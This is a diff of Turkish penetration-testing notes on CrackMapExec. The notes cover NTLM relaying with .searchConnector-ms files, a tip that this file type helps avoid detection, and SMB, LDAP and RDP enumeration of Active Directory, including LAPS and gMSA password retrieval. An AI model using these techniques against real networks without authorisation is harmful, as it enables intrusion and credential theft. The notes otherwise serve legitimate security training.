-![Pasted image 20241202202007.png](/img/user/resimler/Pasted%20image%2020241202202007.png)
+{{CODE_BLOCK_122}}
 
-![Pasted image 20241202202025.png](/img/user/resimler/Pasted%20image%2020241202202025.png)
+{{CODE_BLOCK_123}}
 
-Bir kullanıcı paylaşılan klasöre eriştiğinde ve ntlmrelayx dinlerken, hedef makineye de aktarım yapabilmeliyiz.
+Bir kullanıcı **paylaşılan klasöre** eriştiğinde ve **ntlmrelayx** dinleme modunda çalışırken, kimlik bilgilerini **hedef makineye yönlendirebilmemiz** gerekir.
 
+### NTLMRelayx ve drop-sc Kullanarak Yönlendirme
 
-### NTLMRelayx ve drop-sc Kullanarak Aktarma
+{{CODE_BLOCK_124}}
 
-![Pasted image 20241202202103.png](/img/user/resimler/Pasted%20image%2020241202202103.png)
-![Pasted image 20241202202112.png](/img/user/resimler/Pasted%20image%2020241202202112.png)
-
-Son olarak, CLEANUP=True seçeneği ile .searchConnector-ms dosyasını temizleyebiliriz:
+Son olarak, `CLEANUP=True` seçeneği ile `.searchConnector-ms` dosyasını temizleyebiliriz:
 
 
 ### searchConnector-ms Dosyalarını Temizleme
-![Pasted image 20241202202155.png](/img/user/resimler/Pasted%20image%2020241202202155.png)
-![Pasted image 20241202202201.png](/img/user/resimler/Pasted%20image%2020241202202201.png)
 
-LNK dosyaları genellikle bu tür saldırılar için bilinir. .searchConnector-ms gibi başka bir dosya türü kullanmak, fark edilmemenize yardımcı olabilir.
+{{CODE_BLOCK_125}}
 
 
-### SMB ile Eşleme ve Numaralandırma
+LNK dosyaları genellikle bu tür saldırılar için bilinir. `.searchConnector-ms` gibi başka bir dosya türü kullanmak, fark edilmemenize yardımcı olabilir.
+
+Sonraki bölümlerde CrackMapExec'in keşif seçeneklerini inceleyeceğiz.
+
+---
+
+
+### SMB ile Mapping ve Enumeration
 
 CrackMapExec, geçerli bir domain kullanıcı hesabıyla numaralandırma söz konusu olduğunda çok daha fazla seçenekle birlikte gelir. En çok kullanılan seçenekleri ele aldık, ancak daha derine inelim. İşte ayrıcalıklı olmasa bile geçerli bir hesap aldığımızda kullanabileceğimiz tüm seçeneklerin listesi:
 
-![Pasted image 20241202202635.png](/img/user/resimler/Pasted%20image%2020241202202635.png)
-![Pasted image 20241202202649.png](/img/user/resimler/Pasted%20image%2020241202202649.png)
+| Komut                                                                 | Açıklama                                                          |
+| --------------------------------------------------------------------- | ----------------------------------------------------------------- |
+| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --loggedon-users` | Hedefte oturum açmış kullanıcıları listeler.                      |
+| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --sessions`       | Hedefteki aktif oturumları listeler.                              |
+| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --disks`          | Hedefteki diskleri listeler.                                      |
+| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --computers`      | Hedef ağdaki bilgisayarları listeler.                             |
+| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --wmi`            | Belirtilen WMI sorgusunu çalıştırır.                              |
+| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --wmi-namespace`  | WMI Namespace’ini belirtir (varsayılan: `root\cimv2`).            |
+| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --rid-brute`      | Hedef üzerinde RID brute-force yöntemiyle kullanıcıları listeler. |
+| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --local-groups`   | Local grupları listeler; grup belirtilirse üyelerini listeler.    |
+| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --shares`         | Hedefteki tüm paylaşım izinlerini listeler.                       |
+| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --users`          | Hedefteki domain kullanıcılarını listeler.                        |
+| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --groups`         | Hedefteki domain gruplarını listeler.                             |
+| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --pass-pol`       | Domainin password policy'sini gösterir.                           |
 
 Daha önce çalışmamış olanları gözden geçirelim:
 
-### Hedefteki etkin oturumları / oturum açmış kullanıcıları numaralandırma
+### Hedefteki aktif oturumları / oturum açmış kullanıcıları numaralandırma
 
-Birden fazla hedefi tehlikeye attıysak, etkin oturumları kontrol etmeye değer olabilir, belki bir domain yöneticisi vardır ve çabamızı bu belirli hedefe odaklamamız gerekir. Bir bilgisayardaki kullanıcıları tanımlamak için --sessions ve --loggedon-users seçeneklerini kullanabiliriz. Oturumlar, kullanıcı oturum açmamış olsa bile kullanıcı kimlik bilgilerinin hedef makinede kullanıldığı anlamına gelir. Oturum açmış kullanıcılar kendi kendini açıklar; bir kullanıcının hedef makinede oturum açtığı anlamına gelir. Bloodhound, aktif oturumları bulmak için kullanabileceğimiz başka bir araçtır.
+Birden fazla hedefi ele geçirmişsek, aktif oturumları kontrol etmek faydalı olabilir, belki bir domain administrator vardır ve bu belirli hedefe odaklanmamız gerekebilir. Bir bilgisayardaki kullanıcıları tespit etmek için `--sessions` ve `--loggedon-users` seçeneklerini kullanabiliriz. Session'lar, kullanıcının hedef makinede giriş yapmıyor olsa da kullanıcı kimlik bilgileriyle oturum açıldığı anlamına gelir. Giriş yapmış kullanıcılar ise kendiliğinden anlaşılır; bir kullanıcının hedef makineye giriş yapmış olduğunu ifade eder. `BloodHound`, aktif oturumları bulmak için kullanabileceğimiz bir diğer araçtır.
 
 
 ### Sessions ve loggendon-users seçeneklerini kullanma
-![Pasted image 20241202203026.png](/img/user/resimler/Pasted%20image%2020241202203026.png)
 
-Belirli bir kullanıcıyı arıyorsak, --loggedon-users-filter seçeneğini ve ardından aradığımız kullanıcının adını kullanabiliriz. Birden fazla kullanıcı arıyorsak, regex'i de destekler.
+{{CODE_BLOCK_126}}
+
+Belirli bir kullanıcıyı arıyorsak, -`-loggedon-users-filter` seçeneğini ve ardından aradığımız kullanıcının adını kullanabiliriz. Birden fazla kullanıcı arıyorsak, `regex`'i de destekler.
 
 
 ### Oturum açmış kullanıcılarla filtre seçeneğini kullanma
-![Pasted image 20241202203114.png](/img/user/resimler/Pasted%20image%2020241202203114.png)
-![Pasted image 20241202203120.png](/img/user/resimler/Pasted%20image%2020241202203120.png)
+
+{{CODE_BLOCK_127}}
+
+Not: Genellikle, `--loggedon-users` veya `--sessions` parametrelerinin başarılı bir şekilde çalıştırılabilmesi için administrator izinleri gereklidir.
+
 
 
 ### Enumerate Computers
 
 CME ayrıca domain bilgisayarlarını da listeleyebilir ve bunu bir LDAP isteği gerçekleştirerek yapar
 
-
 ### Domain'deki Bilgisayarları Numaralandırma
-![Pasted image 20241202203511.png](/img/user/resimler/Pasted%20image%2020241202203511.png)
+
+{{CODE_BLOCK_128}}
+
 
 Not: Bu seçenek yalnızca SMB protokolünde mevcut olsa da, CME bir LDAP sorgusu yapmaktadır.
 
 
 ### Enumerate LAPS
 
-Local Administrator Password Solution (LAPS), domain'e bağlı bilgisayarların local hesap parolalarının yönetimini sağlar. Parolalar Active Directory'de (AD) saklanır ve ACL tarafından korunur, böylece yalnızca uygun kullanıcılar bunları okuyabilir veya sıfırlama talebinde bulunabilir. LAPS domain içinde kullanılıyorsa ve LAPS şifrelerini okuyabilen bir hesabı tehlikeye atarsak, --laps seçeneğini bir hedef listesi ile kullanabilir ve komutları çalıştırabilir veya --sam gibi diğer seçenekleri kullanabiliriz.
+Local Administrator Password Solution (LAPS), domain'e bağlı bilgisayarların local hesap parolalarının yönetimini sağlar. Parolalar Active Directory'de (AD) saklanır ve ACL tarafından korunur, böylece yalnızca uygun kullanıcılar bunları okuyabilir veya sıfırlama talebinde bulunabilir. LAPS domain içinde kullanılıyorsa ve LAPS şifrelerini okuyabilen bir hesabı tehlikeye atarsak, `--laps` seçeneğini bir hedef listesi ile kullanabilir ve komutları çalıştırabilir veya `--sam` gibi diğer seçenekleri kullanabiliriz.
 
-![Pasted image 20241202203817.png](/img/user/resimler/Pasted%20image%2020241202203817.png)
 
-![Pasted image 20241202203835.png](/img/user/resimler/Pasted%20image%2020241202203835.png)
+{{CODE_BLOCK_129}}
 
-![Pasted image 20241202203857.png](/img/user/resimler/Pasted%20image%2020241202203857.png)
-
-Not: Varsayılan yönetici hesabı adı “administrator” değilse, kullanıcı adını --laps kullanıcı adı seçeneğinden sonra ekleyin.
-
+Not: Eğer varsayılan administrator hesap adı "`administrator`" değilse, -`-laps username` seçeneğinden sonra kullanıcı adını ekleyin.
 
 ### Hedefteki RID'yi Brute-forcing yaparak Kullanıcıları Numaralandır --rid-brute
 
-Nadiren kullanılan bir özellik, kullanıcı listeleri oluşturmak için RID Bruteforce'dur. BloodHound veya PowerView ile bir kullanıcı listesi oluşturabiliriz. Ancak, bu teknikler muhtemelen yakalanacak ve kurulumu biraz zaman alacaktır. CrackMapExec'in --rid-brute seçeneğini kullanarak, UserID'sini brute forcing yaparak bir kullanıcı listesi toplamak mümkündür.
+Nadiren kullanılan bir özellik, kullanıcı listeleri oluşturmak için `RID Bruteforce`'dur. `BloodHound` veya `PowerView` ile bir kullanıcı listesi oluşturabiliriz. Ancak, bu teknikler muhtemelen yakalanacak ve kurulumu biraz zaman alacaktır. CrackMapExec'in `--rid-brute` seçeneğini kullanarak, UserID'sini brute forcing yaparak bir kullanıcı listesi toplamak mümkündür.
 
 
 ### List Local Users
 
-![Pasted image 20241202204115.png](/img/user/resimler/Pasted%20image%2020241202204115.png)
-![Pasted image 20241202204130.png](/img/user/resimler/Pasted%20image%2020241202204130.png)
-![Pasted image 20241202204141.png](/img/user/resimler/Pasted%20image%2020241202204141.png)
-![Pasted image 20241202204153.png](/img/user/resimler/Pasted%20image%2020241202204153.png)
-![Pasted image 20241202204200.png](/img/user/resimler/Pasted%20image%2020241202204200.png)
+{{CODE_BLOCK_130}}
 
-Varsayılan olarak, --rid-brute 4000'e kadar RID'leri zorlayarak nesneleri numaralandırır. Davranışını --rid-brute [MAX_RID] kullanarak değiştirebiliriz.
+Varsayılan olarak, `--rid-brute 4000`'e kadar RID'leri zorlayarak objeleri numaralandırır. Davranışını `--rid-brute [MAX_RID]` kullanarak değiştirebiliriz.
 
-rid-brute seçeneği, brute ile zorlanan kimliklerle eşleşen kullanıcı adlarını ve diğer Active Directory nesnelerini almak için kullanılabilir. NULL Authentication etkinleştirilmişse domain hesaplarını numaralandırmak için de kullanılabilir. Bu seçeneğin bu şekillerde kullanılabileceğini unutmamak önemlidir.
-
+`--rid-brute` seçeneği, brute ile zorlanan kimliklerle eşleşen kullanıcı adlarını ve diğer Active Directory objeleri almak için kullanılabilir. `NULL Authentication` etkinleştirilmişse domain hesaplarını numaralandırmak için de kullanılabilir. Bu seçeneğin bu şekillerde kullanılabileceğini unutmamak önemlidir.
 
 ### Enumerate Disks
 
-Bazen kontrol etmeyi hatırlamamız gereken önemli bir parça, bir sunucuda bulunabilecek ek disklerdir. CrackMapExec, sunucuda var olan diskleri kontrol etmemizi sağlayan bir --disks seçeneğine sahiptir.
+Bazen kontrol etmeyi hatırlamamız gereken önemli bir parça, bir sunucuda bulunabilecek ek disklerdir. CrackMapExec, sunucuda var olan diskleri kontrol etmemizi sağlayan bir `--disks` seçeneğine sahiptir.
 
 ### Enumerating Disks
-![Pasted image 20241202204448.png](/img/user/resimler/Pasted%20image%2020241202204448.png)
+
+{{CODE_BLOCK_131}}
 
 
 ### Local ve Domain Gruplarını Numaralandırma
-Local-groups ile local grupları veya --groups ile domain gruplarını listeleyebiliriz.
+
+Local-groups ile local grupları veya `--groups` ile domain gruplarını listeleyebiliriz.
 
 ### Enumerating Local Groups
-![Pasted image 20241202204607.png](/img/user/resimler/Pasted%20image%2020241202204607.png)
-![Pasted image 20241202204629.png](/img/user/resimler/Pasted%20image%2020241202204629.png)
 
+{{CODE_BLOCK_132}}
 
 ### Enumerating Domain Groups
-![Pasted image 20241202204749.png](/img/user/resimler/Pasted%20image%2020241202204749.png)
-![Pasted image 20241202204830.png](/img/user/resimler/Pasted%20image%2020241202204830.png)
 
-Eğer grup üyelerini almak istiyorsak, --groups [GRUP ADI] kullanabiliriz.
+{{CODE_BLOCK_133}}
+
+
+Eğer grup üyelerini almak istiyorsak, `--groups [GRUP ADI]` kullanabiliriz.
 
 
 ### Group **Members**
-![Pasted image 20241202204931.png](/img/user/resimler/Pasted%20image%2020241202204931.png)
 
-Not: Yazım sırasında --local-group yalnızca bir Domain Controller'a karşı çalışır ve grup adını kullanarak bir grubu sorgulamak işe yaramaz.
+{{CODE_BLOCK_134}}
+
+Not: Yazım sırasında `--local-group` yalnızca bir Domain Controller'a karşı çalışır ve grup adını kullanarak bir grubu sorgulamak işe yaramaz.
 
 
-### Querying WMI
-[Windows Management Instrumentation](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page) (WMI), Windows işletim sistemlerinde yönetimsel işlemler için kullanılır. Remote bilgisayarlardaki yönetim görevlerini otomatikleştirmek için WMI komut dosyaları veya uygulamaları yazabiliriz. WMI, işletim sisteminin diğer bölümlerine ve System Center Operations Manager (eski adıyla Microsoft Operations Manager (MOM)) veya Windows Remote Management (WinRM) gibi ürünlere yönetim verileri sağlar.
+### WMI Sorgulama
 
-Windows Yönetim Araçları'nın (WMI) birincil kullanım alanlarından biri, sınıf ve örnek bilgileri için WMI havuzunu sorgulama yeteneğidir. Örneğin, WMI'dan remote veya local bir sistemden shut-down olaylarını temsil eden tüm nesneleri döndürmesini isteyebiliriz.
+[Windows Management Instrumentation](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page) (WMI), Windows işletim sistemlerinde administrative işlemler için kullanılır. Remote bilgisayarlardaki administrative görevlerini otomatikleştirmek için WMI script dosyaları veya uygulamaları yazabiliriz. WMI, işletim sisteminin diğer bölümlerine ve System Center Operations Manager (eski adıyla Microsoft Operations Manager (MOM)) veya Windows Remote Management (WinRM) gibi ürünlere yönetim verileri sağlar.
 
-WMI, TCP port 135 ve bir dizi dinamik port kullanır: 49152-65535 (RPC dinamik portları - Windows Vista, 2008 ve üzeri), TCP 1024-65535 (RPC dinamik portları - Windows NT4, Windows 2000, Windows 2003) veya WMI'yı özel bir port aralığı kullanacak şekilde ayarlayabiliriz
+Windows Management Instrumentation'nın (WMI) birincil kullanım alanlarından biri, sınıf (class) ve örnek (instance) bilgileri için WMI havuzunu sorgulama yeteneğidir. Örneğin, WMI'dan remote veya local bir sistemden shut-down olaylarını temsil eden tüm objeleri döndürmesini isteyebiliriz.
 
-Örneğin, remote bir bilgisayarda Sysmon uygulamasının çalışıp çalışmadığını sorgulamak ve Caption ve ProcessId'yi görüntülemek için WMI kullanalım, kullanacağımız WMI sorgusu SELECT Caption,ProcessId FROM Win32_Process WHERE Caption LIKE '%sysmon%' şeklindedir:
+WMI, TCP port `135` ve bir dizi dinamik port kullanır: `49152-65535 (RPC dinamik portları - Windows Vista, 2008 ve üzeri)`, TCP 1024-65535 (RPC dinamik portları - Windows NT4, Windows 2000, Windows 2003) veya WMI'yı özel bir port aralığı kullanacak şekilde ayarlayabiliriz
+
+Örneğin, remote bir bilgisayarda `Sysmon` uygulamasının çalışıp çalışmadığını sorgulamak ve `Caption` ve `ProcessId`'yi görüntülemek için WMI kullanalım, kullanacağımız WMI sorgusu S`ELECT Caption,ProcessId FROM Win32_Process WHERE Caption LIKE '%sysmon%'` şeklindedir:
 
 
 ### Sysmon'un Çalışıp Çalışmadığını Sorgulamak için WMI Kullanma
-![Pasted image 20241202210123.png](/img/user/resimler/Pasted%20image%2020241202210123.png)
 
-WMI, sınıflarını hiyerarşik bir ad alanında düzenler. Bir sorgu gerçekleştirmek için, Class Name (Sınıf Adı) ve içinde bulunduğu Namespace'i (Ad Alanı) bilmemiz gerekir. Yukarıdaki örnekte, root\cimv2 namespace'indeki Win32_Process sınıfını sorgulayın. Namespace belirtmedik çünkü varsayılan olarak CME root\cimv2 kullanır (bu bilgiyi --help menüsünde görebiliriz)
+{{CODE_BLOCK_135}}
 
-Başka bir namespace'i sorgulamak için onu belirtmemiz gerekir. Örneğin, root\WMI namespace'inde bulunan MSPower_DeviceEnable sınıfını sorgulayalım. Bu sınıf, sistem çalışırken dinamik olarak açılıp kapanması gereken cihazlar hakkında bilgi tutar. Belirli bir konuyla ilgili WMI sınıflarının nasıl bulunacağı hakkında daha fazla bilgi edinmek için [Microsoft](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_wmi?view=powershell-5.1#finding-wmi-classes) ve [wutils.com'](https://wutils.com/wmi/)daki 3. taraf belgelerini kullanabiliriz.
+WMI, sınıflarını hiyerarşik bir namespace içinde düzenler. Bir sorgu gerçekleştirmek için, Class Name ve bulunduğu Namespace'i bilmemiz gerekir. Yukarıdaki örnekte, `Win32_Process` sınıfını `root\cimv2` namespace'inde sorguluyoruz. Namespace'i belirtmedik çünkü varsayılan olarak CME, `root\cimv2`'yi kullanır (bu bilgiyi --help menüsünde görebiliriz).
+
+Başka bir namespace'i sorgulamak için onu belirtmemiz gerekir. Örneğin, `root\WMI` namespace'inde bulunan `MSPower_DeviceEnable` sınıfını sorgulayalım. Bu sınıf, sistem çalışırken dinamik olarak açılıp kapanması gereken cihazlar hakkında bilgi tutar. Belirli bir konuyla ilgili WMI sınıflarının nasıl bulunacağı hakkında daha fazla bilgi edinmek için [Microsoft](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_wmi?view=powershell-5.1#finding-wmi-classes) ve [wutils.com'](https://wutils.com/wmi/)daki 3. taraf belgelerini kullanabiliriz.
 
 
 ### Quering root\WMI Namespace
-![Pasted image 20241202212300.png](/img/user/resimler/Pasted%20image%2020241202212300.png)
-![Pasted image 20241202212343.png](/img/user/resimler/Pasted%20image%2020241202212343.png)
 
-Not: Genellikle, WMI'yı sorgulamak için yönetici ayrıcalıklarına sahip olmamız gerekir, ancak bir yönetici, WMI'yı sorgulamak için yönetici olmayan bir hesabı yapılandırabilir. Bu durumda, WMI sorgularını gerçekleştirmek için yönetici olmayan bir hesap kullanabiliriz.
+{{CODE_BLOCK_136}}
 
-WMI Sorgu Dili (WQL) hakkında daha fazla bilgi edinmek için Microsoft'un Belgelerini okuyabiliriz.
+Not: Genellikle, WMI'yı sorgulamak için administrative ayrıcalıklarına sahip olmamız gerekir, ancak bir administrator, WMI'yı sorgulamak için administrator olmayan bir hesabı yapılandırabilir. Bu durumda, WMI sorgularını gerçekleştirmek için administrator olmayan bir hesap kullanabiliriz.
+
+WMI Sorgu Dili (WQL) hakkında daha fazla bilgi edinmek için [Microsoft'un Belgelerini](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wql-sql-for-wmi) okuyabiliriz.
+
+
 
 Aşağıdaki bölüm LDAP ve RDP protokollerini kullanarak numaralandırmayı kapsayacaktır.
 
+----
+
 
 ### LDAP and RDP Enumeration
-Daha önce, CrackMapExec'te en çok kullanılan protokol olan SMB ile bazı numaralandırma seçeneklerini inceledik, ancak LDAP ve RDP protokolleri ile daha fazla numaralandırma seçeneği vardır
+
+Daha önce, CrackMapExec'te en çok kullanılan protokol olan `SMB` ile bazı numaralandırma seçeneklerini inceledik, ancak `LDAP` ve `RDP` protokolleri ile daha fazla numaralandırma seçeneği vardır
 
 Bu bölümde, bu seçeneklerden bazıları ve hedeflerimizi nasıl daha fazla numaralandırabileceğimiz gösterilecektir
 
-
 ### LDAP & RDP Commands
+
 LDAP ve RDP protokolleri aşağıdaki seçenekleri içerir:
-![Pasted image 20241202225531.png](/img/user/resimler/Pasted%20image%2020241202225531.png)
-![Pasted image 20241202225542.png](/img/user/resimler/Pasted%20image%2020241202225542.png)
 
-Henüz çalışmadıklarımızı gözden geçirelim.
+| Komut                                                                          | Açıklama                                                                                           |
+| ------------------------------------------------------------------------------ | -------------------------------------------------------------------------------------------------- |
+| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --users`                  | Etkin Domain kullanıcılarını listeler.                                                             |
+| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --groups`                 | Domain gruplarını listeler.                                                                        |
+| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --password-notrequired`   | `PASSWORD_NOTREQD` bayrağı olan kullanıcıları listeler.                                            |
+| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --trusted-for-delegation` | `TRUSTED_FOR_DELEGATION` bayrağı olan kullanıcı ve bilgisyalarını listeler.                        |
+| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --admin-count`            | `adminCount=1` derecesine sahip objeleri listeler.                                                 |
+| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --get-sid`                | Domainin SID bilgisini alır.                                                                       |
+| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --gmsa`                   | GMSA (Gruplandırılmış Yönetici Hizmet Hesapları) şifrelerini listeler.                             |
+| `crackmapexec rdp <hedef> -u <kullanıcı> -p <şifre> --nla-screenshot`          | NLA (Ağ Seviyesinde Kimlik Doğrulaması) devre dışı ise RDP giriş ekranının ekran görüntüsünü alır. |
+| `crackmapexec rdp <hedef> -u <kullanıcı> -p <şifre> --screenshot`              | Bağlantı başarılıysa RDP oturumunun ekran görüntüsünü alır.                                        |
+| `crackmapexec rdp <hedef> -u <kullanıcı> -p <şifre> --screentime`              | Masaüstü görüntüsü için bekleme süresini belirtir.                                                 |
+| `crackmapexec rdp <hedef> -u <kullanıcı> -p <şifre> --res RES`                 | Çözünürlük belirler (örnek format: WIDTHxHEIGHT, varsayılan: 1024x768).                            |
 
+Henüz çalışmadıklarımız varsa onları gözden geçirelim.
 
 ### Enumerating Users and Groups
 
-SMB protokolünde yaptığımız gibi, LDAP ile de kullanıcıları ve grupları listeleyebiliriz:
+SMB protokolünde yaptığımız gibi, `LDAP` ile de kullanıcıları ve grupları listeleyebiliriz:
 
 ### Enumerating Users and Groups
 
-![Pasted image 20241202225710.png](/img/user/resimler/Pasted%20image%2020241202225710.png)
-![Pasted image 20241202225721.png](/img/user/resimler/Pasted%20image%2020241202225721.png)
-![Pasted image 20241202225733.png](/img/user/resimler/Pasted%20image%2020241202225733.png)
-![Pasted image 20241202225743.png](/img/user/resimler/Pasted%20image%2020241202225743.png)
+{{CODE_BLOCK_137}}
 
-Not: Domain FQDN'sini çözümleyemezsek LDAP protokol iletişimlerinin çalışmayacağını unutmayın. Domain DNS sunucularına bağlanmıyorsak, FQDN'yi /etc/hosts dosyasında yapılandırmamız gerekir
+Not: Domain FQDN'sini çözümleyemezsek LDAP protokol iletişimlerinin çalışmayacağını unutmayın. Domain DNS sunucularına bağlanmıyorsak, FQDN'yi `/etc/hosts` dosyasında yapılandırmamız gerekir
 
 
 ### İlginç Hesap Özelliklerini Numaralandırma
 
-ldap protokolü, PASSWD_NOTREQD veya TRUSTED_FOR_DELEGATION bayrağı ile hesapları tanımlamamıza yardımcı olacak birkaç seçeneğe daha sahiptir ve hatta adminCount değeri 1 olan tüm hesapları sorgulayabiliriz.
+`ldap` protokolü, `PASSWD_NOTREQD` veya `TRUSTED_FOR_DELEGATION` bayrağı ile hesapları tanımlamamıza yardımcı olacak birkaç seçeneğe daha sahiptir ve hatta `adminCount` değeri `1` olan tüm hesapları sorgulayabiliriz.
 
-PASSWD_NOTREQD hesap denetimi özniteliği ayarlanmışsa, kullanıcı geçerli parola ilkesi uzunluğuna tabi değildir, yani daha kısa bir parolaya sahip olabilir veya hiç parola kullanmayabilir ( domain'de boş parolalara izin veriliyorsa). Bu hesapları tanımlamak için --password-notrequired seçeneğini kullanabiliriz.
-
-
-### PASSWD_NOTREQD Özniteliğinin Tanımlanması
-
-![Pasted image 20241202230116.png](/img/user/resimler/Pasted%20image%2020241202230116.png)
-![Pasted image 20241202230124.png](/img/user/resimler/Pasted%20image%2020241202230124.png)
-
-TRUSTED_FOR_DELEGATION özniteliği ayarlanırsa, bir hizmetin altında çalıştığı hizmet hesabı (kullanıcı veya bilgisayar) Kerberos yetkilendirmesi için güvenilirdir, yani hizmeti talep eden bir istemciyi taklit edebilir. Bu saldırı türüne Kerberos Unconstrained Delegation adı verilir. Bu konu hakkında daha fazla bilgi edinmek için bu [blog](https://adsecurity.org/?p=1667) yazısını okuyabilirsiniz.
-
-### Kısıtlamasız Delegasyonun Belirlenmesi
-![Pasted image 20241202230729.png](/img/user/resimler/Pasted%20image%2020241202230729.png)
-
-adminCount özniteliği, SDProp işleminin bir kullanıcıyı koruyup korumadığını belirler. Bu işlemde, Active Directory'deki AdminSDHolder, korunan kullanıcı hesaplarının ACL izinleri için bir şablon görevi görür. Herhangi bir ACE hesabı değiştirilirse (örneğin, bir saldırgan tarafından), bu işlem tarafından korunan hesapların ACL izinleri, SDProp işlemi her çalıştığında şablon izin kümesine sıfırlanır; bu varsayılan olarak her 60 dakikada bir yapılır ancak değiştirilebilir. Değer 0 olarak ayarlanmışsa veya belirtilmemişse kullanıcı kapsam dışıdır. Öznitelik değeri 1 olarak ayarlanırsa kullanıcı korunur. Saldırganlar genellikle dahili bir ortamda hedef almak için adminCount özniteliği 1 olarak ayarlanmış hesapları ararlar. Bunlar genellikle ayrıcalıklı hesaplardır ve daha fazla erişime veya domain'in tamamen ele geçirilmesine yol açabilir.
+`PASSWD_NOTREQD` hesap denetimi attribute ayarlanmışsa, kullanıcı geçerli password policy uzunluğuna tabi değildir, yani daha kısa bir parolaya sahip olabilir veya hiç parola kullanmayabilir (domain'de boş parolalara izin veriliyorsa). Bu hesapları tanımlamak için  `--password-notrequired` seçeneğini kullanabiliriz.
 
 
-### adminCount Özniteliğini Sorgulama
-![Pasted image 20241202230901.png](/img/user/resimler/Pasted%20image%2020241202230901.png)
-![Pasted image 20241202230911.png](/img/user/resimler/Pasted%20image%2020241202230911.png)
-![Pasted image 20241202230921.png](/img/user/resimler/Pasted%20image%2020241202230921.png)
+### PASSWD_NOTREQD Attribute Tanımlanması
+
+{{CODE_BLOCK_138}}
+
+`TRUSTED_FOR_DELEGATION` attribute ayarlanırsa, bir servisin altında çalıştığı servis hesabı (kullanıcı veya bilgisayar) Kerberos yetkilendirmesi için güvenilirdir, yani servisi talep eden bir client'i taklit edebilir. Bu saldırı türüne `Kerberos Unconstrained Delegation` adı verilir. Bu konu hakkında daha fazla bilgi edinmek için bu [blog](https://adsecurity.org/?p=1667) yazısını okuyabilirsiniz.
+
+### Unconstrained Delegation Belirlenmesi
+
+{{CODE_BLOCK_139}}
+
+`AdminCount` attribute, SDProp process'in bir kullanıcıyı koruyup korumadığını belirler. Bu process'te, Active Directory'deki `AdminSDHolder`, korunan user account'lar için ACL permissions'ın bir template'i olarak görev yapar. Eğer herhangi bir account ACE'si (örneğin, bir attacker tarafından) modified edilirse, bu process tarafından korunan account'ların ACL permissions'ı, `SDProp` process her çalıştığında (default olarak her 60 dakikada bir çalışır, ancak bu süre modified edilebilir) templated permission set'e resetlenir. User, adminCount değeri 0 olarak set edilmişse veya specified değilse bu koruma kapsamına girmez. Eğer attribute value 1 olarak set edilmişse, user korunur. Attacker'lar genellikle internal environment'ta adminCount attribute'i 1 olan account'ları target olarak arar. Bunlar genellikle privileged account'lardır ve further access veya full domain compromise ile sonuçlanabilir.
+
+
+### adminCount Attribute'u Sorgulama
+
+{{CODE_BLOCK_140}}
 
 
 ### Domain SID'sini numaralandırma
 
-Bazı domain saldırıları, kullanıcı veya domain SID'si gibi belirli domain bilgilerini edinmemizi gerektirir. SID (Security IDentifier), bir bilgisayarın veya domain controller'ın sizi tanımlamak için kullandığı benzersiz bir kimlik numarasıdır. Domain sid, domain'i tanımlayan benzersiz bir kimlik numarasıdır. CrackMapExec kullanarak domain sid'sini almak için --get-sid bayrağını kullanabiliriz:
+Bazı domain attack'ları, bir user veya domain SID gibi belirli domain bilgilerini elde etmemizi gerektirir. SID (Security IDentifier), bir computer veya domain controller'ın sizi tanımlamak için kullandığı `unique bir ID` numarasıdır. Domain SID ise domain'i tanımlayan unique bir ID numarasıdır. CrackMapExec kullanarak domain SID'i elde etmek için `--get-sid` flag'ini kullanabiliriz:
 
+### Domain SID'i Toplama
 
-### Gathering the Domain SID
-
-![Pasted image 20241202231106.png](/img/user/resimler/Pasted%20image%2020241202231106.png)
-![Pasted image 20241202231112.png](/img/user/resimler/Pasted%20image%2020241202231112.png)
+{{CODE_BLOCK_141}}
 
 
 ### Group Managed Service Accounts (gMSA)
@@ -12324,138 +13249,158 @@ Bağımsız Yönetilen Hizmet Hesabı (standalone Managed Service Account) (sMSA
 * Basitleştirilmiş service principal name (SPN) yönetimi.
 * Yönetimi diğer yöneticilere devretme yeteneği
 
-Bu yönetilen hizmet hesabı (MSA) türü Windows Server 2008 R2 ve Windows 7'de tanıtılmıştır.
+Bu yönetilen servis hesabı (MSA) türü Windows Server 2008 R2 ve Windows 7'de tanıtılmıştır.
 
 Group Managed Service Account (gMSA) domain içinde aynı işlevselliği sağlar ancak aynı zamanda bu işlevselliği birden fazla sunucuya genişletir.
 
 Bir gMSA hesabının parolasını okuma ayrıcalıklarına sahip bir hesabı belirlemek için PowerShell'i kullanabiliriz (komut yürütmeyi bir sonraki bölümde daha ayrıntılı olarak ele alacağız):
 
-
 ### Enumerating Accounts with gMSA Privileges
-![Pasted image 20241202231402.png](/img/user/resimler/Pasted%20image%2020241202231402.png)
-![Pasted image 20241202231409.png](/img/user/resimler/Pasted%20image%2020241202231409.png)
 
-Yukarıdaki örnekte, engels kullanıcısının PrincipalsAllowedToRetrieveManagedPassword ayrıcalığına sahip olduğunu görebiliriz, bu da svc_inlaneadm$ gMSA hesabının parolasını okuyabileceği anlamına gelir. gMSA parolasını okuma hakkına sahip bir hesabı tehlikeye atarsak, hesabın NTLM parola hash'ini almak için --gmsa seçeneğini kullanabiliriz.
+{{CODE_BLOCK_142}}
+
+
